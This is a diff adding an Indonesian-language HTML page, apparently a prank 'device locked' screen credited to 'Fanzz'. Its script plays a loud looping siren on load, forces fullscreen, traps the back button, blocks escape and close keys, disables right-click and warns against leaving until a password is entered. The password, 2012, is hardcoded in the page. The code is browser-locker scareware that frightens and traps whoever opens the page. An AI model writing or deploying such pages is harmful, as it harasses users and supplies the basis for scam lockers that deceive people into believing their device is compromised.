@@ -1,0 +1,482 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <title>LOCK BY: Fanzz</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        html, body {
+            width: 100vw;
+            height: 100vh;
+            height: 100dvh;
+            overflow: hidden;
+            overscroll-behavior: none;
+            -webkit-overflow-scrolling: none;
+        }
+        body {
+            background: #8B0000;
+            font-family: 'Courier New', monospace;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            user-select: none;
+            -webkit-user-select: none;
+            touch-action: manipulation;
+            transition: background 0.5s ease;
+        }
+        body.unlocked-bg {
+            background: #111;
+            /* background normal setelah unlock */
+        }
+
+        /* ========== PANIC BACKGROUND ========== */
+        .panic-bg {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(45deg, #8B0000, #FF0000, #B22222, #DC143C, #8B0000);
+            background-size: 400% 400%;
+            animation: panicPulse 0.5s ease-in-out infinite;
+            z-index: 1;
+            transition: opacity 0.5s ease;
+        }
+        .panic-bg.hidden {
+            opacity: 0;
+            pointer-events: none;
+        }
+        @keyframes panicPulse {
+            0%,
+            100% {
+                background-position: 0% 50%;
+            }
+            50% {
+                background-position: 100% 50%;
+            }
+        }
+
+        /* ========== OVERLAY GELAP ========== */
+        .overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.5);
+            z-index: 2;
+            transition: opacity 0.5s ease;
+        }
+        .overlay.hidden {
+            opacity: 0;
+            pointer-events: none;
+        }
+
+        /* ========== LOCK CONTAINER ========== */
+        .lock-container {
+            position: relative;
+            z-index: 3;
+            background: rgba(0, 0, 0, 0.8);
+            border: 3px solid #FF0000;
+            border-radius: 20px;
+            padding: 30px 25px;
+            text-align: center;
+            max-width: 400px;
+            width: 90%;
+            box-shadow: 0 0 50px rgba(255, 0, 0, 0.8), 0 0 100px rgba(255, 0, 0, 0.5);
+            animation: shakeBorder 0.3s ease-in-out infinite;
+            transition: all 0.5s ease;
+        }
+        .lock-container.hidden {
+            opacity: 0;
+            transform: scale(0.8);
+            pointer-events: none;
+        }
+        @keyframes shakeBorder {
+            0%,
+            100% {
+                box-shadow: 0 0 50px rgba(255, 0, 0, 0.8), 0 0 100px rgba(255, 0, 0, 0.5);
+            }
+            25% {
+                box-shadow: -10px 0 60px rgba(255, 0, 0, 1), 0 0 120px rgba(255, 0, 0, 0.7);
+            }
+            50% {
+                box-shadow: 0 0 70px rgba(255, 0, 0, 0.9), 10px 0 110px rgba(255, 0, 0, 0.6);
+            }
+            75% {
+                box-shadow: 10px 0 60px rgba(255, 0, 0, 1), 0 0 100px rgba(255, 0, 0, 0.8);
+            }
+        }
+        .lock-icon {
+            font-size: 70px;
+            animation: bounceLock 0.6s ease-in-out infinite;
+        }
+        @keyframes bounceLock {
+            0%,
+            100% {
+                transform: translateY(0);
+            }
+            50% {
+                transform: translateY(-20px);
+            }
+        }
+        .title {
+            color: #FF0000;
+            font-size: 28px;
+            font-weight: bold;
+            margin: 15px 0 5px;
+            text-shadow: 0 0 20px #FF0000, 0 0 40px #FF0000;
+            animation: flicker 0.1s infinite alternate;
+        }
+        @keyframes flicker {
+            0% {
+                opacity: 1;
+            }
+            100% {
+                opacity: 0.7;
+            }
+        }
+        .subtitle {
+            color: #FF4444;
+            font-size: 14px;
+            margin-bottom: 20px;
+            text-transform: uppercase;
+            letter-spacing: 3px;
+        }
+        .warning {
+            color: #FFF;
+            font-size: 14px;
+            margin-bottom: 5px;
+            animation: blinkText 1s infinite;
+        }
+        .warning-red {
+            color: #FF0000;
+            font-weight: bold;
+            font-size: 16px;
+            margin-bottom: 15px;
+            animation: blinkText 0.5s infinite;
+        }
+        @keyframes blinkText {
+            0%,
+            100% {
+                opacity: 1;
+            }
+            50% {
+                opacity: 0.3;
+            }
+        }
+        .password-input {
+            width: 100%;
+            padding: 15px;
+            font-size: 28px;
+            text-align: center;
+            background: #1a0000;
+            border: 2px solid #FF0000;
+            color: #FF0000;
+            border-radius: 10px;
+            outline: none;
+            letter-spacing: 15px;
+            font-family: 'Courier New', monospace;
+            caret-color: #FF0000;
+            margin-bottom: 15px;
+            -webkit-text-security: disc;
+        }
+        .password-input::placeholder {
+            color: #660000;
+            letter-spacing: 2px;
+            font-size: 16px;
+        }
+        .password-input:focus {
+            box-shadow: 0 0 30px rgba(255, 0, 0, 0.8);
+            border-color: #FF4444;
+        }
+        .btn-container {
+            display: flex;
+            gap: 10px;
+            justify-content: center;
+        }
+        .btn {
+            padding: 12px 30px;
+            font-size: 16px;
+            font-weight: bold;
+            border: none;
+            border-radius: 8px;
+            cursor: pointer;
+            text-transform: uppercase;
+            letter-spacing: 2px;
+            transition: all 0.2s;
+        }
+        .btn-unlock {
+            background: #FF0000;
+            color: white;
+            border: 2px solid #FF4444;
+            animation: pulseBtn 1s infinite;
+        }
+        .btn-unlock:hover {
+            background: #CC0000;
+            box-shadow: 0 0 30px #FF0000;
+        }
+        .btn-unlock:active {
+            transform: scale(0.95);
+        }
+        .btn-lock {
+            background: #8B0000;
+            color: #FF8888;
+            border: 2px solid #B22222;
+        }
+        .btn-lock:hover {
+            background: #660000;
+            box-shadow: 0 0 20px #FF0000;
+        }
+        .btn-lock:active {
+            transform: scale(0.95);
+        }
+        @keyframes pulseBtn {
+            0%,
+            100% {
+                transform: scale(1);
+            }
+            50% {
+                transform: scale(1.05);
+            }
+        }
+        .error-msg {
+            color: #FFFF00;
+            font-size: 14px;
+            margin-top: 10px;
+            min-height: 20px;
+            transition: color 0.3s;
+        }
+        .credit {
+            color: #FF0000;
+            font-size: 12px;
+            margin-top: 20px;
+            letter-spacing: 2px;
+            opacity: 0.8;
+            transition: opacity 0.5s;
+        }
+
+        /* ========== NORMAL CONTENT (SETELAH UNLOCK) ========== */
+        .normal-content {
+            position: relative;
+            z-index: 10;
+            text-align: center;
+            color: #FFF;
+            display: none;
+            opacity: 0;
+            transition: opacity 0.5s ease;
+        }
+        .normal-content.show {
+            display: block;
+            opacity: 1;
+        }
+        .normal-content h1 {
+            font-size: 36px;
+            margin-bottom: 10px;
+            color: #00FF00;
+        }
+        .normal-content p {
+            font-size: 18px;
+            color: #CCC;
+            margin-bottom: 5px;
+        }
+        .normal-content .unlock-credit {
+            color: #FF0000;
+            font-size: 14px;
+            margin-top: 30px;
+            letter-spacing: 2px;
+            opacity: 0.7;
+        }
+
+        @media (max-width: 480px) {
+            .lock-container {
+                padding: 20px 15px;
+                width: 95%;
+            }
+            .title {
+                font-size: 22px;
+            }
+            .password-input {
+                font-size: 24px;
+                padding: 12px;
+            }
+            .btn {
+                padding: 10px 20px;
+                font-size: 14px;
+            }
+            .normal-content h1 {
+                font-size: 28px;
+            }
+        }
+    </style>
+</head>
+<body>
+
+    <!-- ========== PANIC ELEMENTS ========== -->
+    <div class="panic-bg" id="panicBg"></div>
+    <div class="overlay" id="overlay"></div>
+
+    <div class="lock-container" id="lockContainer">
+        <div class="lock-icon">🔒</div>
+        <div class="title">🔴 TERKUNCI 🔴</div>
+        <div class="subtitle">Akses Ditolak</div>
+        <div class="warning">⚠️ MASUKKAN PASSWORD ⚠️</div>
+        <div class="warning-red">ANTI-BACK ACTIVE</div>
+        <input type="password" id="passwordInput" class="password-input" placeholder="PASSWORD" maxlength="10" inputmode="numeric" pattern="[0-9]*" autocomplete="off">
+        <div class="btn-container">
+            <button class="btn btn-unlock" onclick="unlockDevice()">🔓 UNLOCK</button>
+            <button class="btn btn-lock" onclick="lockDevice()">🔒 LOCK</button>
+        </div>
+        <div class="error-msg" id="errorMsg"></div>
+        <div class="credit">LOCK BY: Fanzz</div>
+    </div>
+
+    <!-- ========== NORMAL CONTENT (SETELAH UNLOCK) ========== -->
+    <div class="normal-content" id="normalContent">
+        <h1>✅ BERHASIL UNLOCK!</h1>
+        <p>Welcome back, Boss! 🫡</p>
+        <p>Device lo udah aman sekarang.</p>
+        <p style="font-size: 14px; color: #888;">Password: 2012</p>
+        <p class="unlock-credit">LOCK BY: Fanzz</p>
+    </div>
+
+    <!-- ==================== SCRIPT ==================== -->
+    <script>
+        // ==================== ALARM SINTETIS KERAS ====================
+        let alarmContext = null;
+        let alarmInterval = null;
+
+        function startAlarm() {
+            if (alarmContext) return;
+            alarmContext = new(window.AudioContext || window.webkitAudioContext)();
+
+            function createTone(freq, duration, startTime) {
+                const osc = alarmContext.createOscillator();
+                const gain = alarmContext.createGain();
+                osc.type = 'square';
+                osc.frequency.setValueAtTime(freq, startTime);
+                gain.gain.setValueAtTime(0.5, startTime);
+                gain.gain.exponentialRampToValueAtTime(0.01, startTime + duration);
+                osc.connect(gain);
+                gain.connect(alarmContext.destination);
+                osc.start(startTime);
+                osc.stop(startTime + duration);
+            }
+
+            function playSiren() {
+                const now = alarmContext.currentTime;
+                for (let i = 0; i < 8; i++) {
+                    createTone(800, 0.1, now + i * 0.2);
+                    createTone(1200, 0.1, now + i * 0.2 + 0.1);
+                }
+                for (let i = 0; i < 8; i++) {
+                    createTone(1000, 0.08, now + 1.6 + i * 0.16);
+                    createTone(600, 0.08, now + 1.6 + i * 0.16 + 0.08);
+                }
+            }
+            playSiren();
+            alarmInterval = setInterval(playSiren, 2900);
+        }
+
+        function stopAlarm() {
+            if (alarmInterval) clearInterval(alarmInterval);
+            if (alarmContext) alarmContext.close();
+            alarmContext = null;
+            alarmInterval = null;
+        }
+
+        // ==================== FUNGSI UTAMA ====================
+        function lockDevice() {
+            // Tampilin lagi semua elemen panik
+            document.getElementById('panicBg').classList.remove('hidden');
+            document.getElementById('overlay').classList.remove('hidden');
+            document.getElementById('lockContainer').classList.remove('hidden');
+            document.getElementById('normalContent').classList.remove('show');
+            document.getElementById('passwordInput').value = '';
+            document.getElementById('errorMsg').textContent = '🔒 DEVICE LOCKED!';
+            document.getElementById('errorMsg').style.color = '#FFFF00';
+            document.body.classList.remove('unlocked-bg');
+            startAlarm();
+            requestFullscreen();
+            document.getElementById('passwordInput').focus();
+        }
+
+        function unlockDevice() {
+            const password = document.getElementById('passwordInput').value;
+            if (password === '2012') {
+                stopAlarm();
+                // Sembunyiin semua elemen panik
+                document.getElementById('panicBg').classList.add('hidden');
+                document.getElementById('overlay').classList.add('hidden');
+                document.getElementById('lockContainer').classList.add('hidden');
+                // Tampilin konten normal
+                document.getElementById('normalContent').classList.add('show');
+                document.body.classList.add('unlocked-bg');
+                document.getElementById('errorMsg').textContent = '';
+            } else {
+                document.getElementById('errorMsg').textContent = '❌ SALAH! COBA LAGI! ❌';
+                document.getElementById('errorMsg').style.color = '#FFFF00';
+                document.getElementById('passwordInput').value = '';
+                document.getElementById('passwordInput').focus();
+                document.getElementById('lockContainer').style.animation = 'none';
+                setTimeout(() => {
+                    document.getElementById('lockContainer').style.animation =
+                        'shakeBorder 0.3s ease-in-out infinite';
+                }, 10);
+            }
+        }
+
+        // ==================== ANTI-BACK & FULLSCREEN ====================
+        window.addEventListener('load', () => {
+            startAlarm();
+            requestFullscreen();
+            document.getElementById('passwordInput').focus();
+        });
+
+        history.pushState(null, null, location.href);
+        window.addEventListener('popstate', () => {
+            history.pushState(null, null, location.href);
+            alert('🔴 TIDAK BISA BACK! MASUKKAN PASSWORD! 🔴');
+        });
+
+        window.addEventListener('beforeunload', (e) => {
+            e.preventDefault();
+            e.returnValue = 'Kamu yakin mau pergi? Masukkan password dulu!';
+            return e.returnValue;
+        });
+
+        document.addEventListener('keydown', (e) => {
+            if (e.key === 'Escape' || e.key === 'F5' || (e.ctrlKey && (e.key === 'r' || e.key ===
+                    'w')) || (e.altKey && e.key === 'F4')) {
+                e.preventDefault();
+                alert('🔴 JANGAN COBA-C0BA KABUR! MASUKKAN PASSWORD! 🔴');
+            }
+            const input = document.getElementById('passwordInput');
+            if (document.activeElement === input) {
+                if (!/[0-9]/.test(e.key) && e.key !== 'Backspace' && e.key !== 'Delete' && e.key !==
+                    'ArrowLeft' && e.key !== 'ArrowRight' && e.key !== 'Tab') {
+                    e.preventDefault();
+                }
+            }
+        });
+
+        function requestFullscreen() {
+            const el = document.documentElement;
+            if (el.requestFullscreen) el.requestFullscreen().catch(() => {});
+            else if (el.webkitRequestFullscreen) el.webkitRequestFullscreen();
+            else if (el.msRequestFullscreen) el.msRequestFullscreen();
+        }
+
+        document.addEventListener('click', () => {
+            document.getElementById('passwordInput').focus();
+        });
+
+        document.addEventListener('contextmenu', (e) => e.preventDefault());
+    </script>
+</body>
+</html>
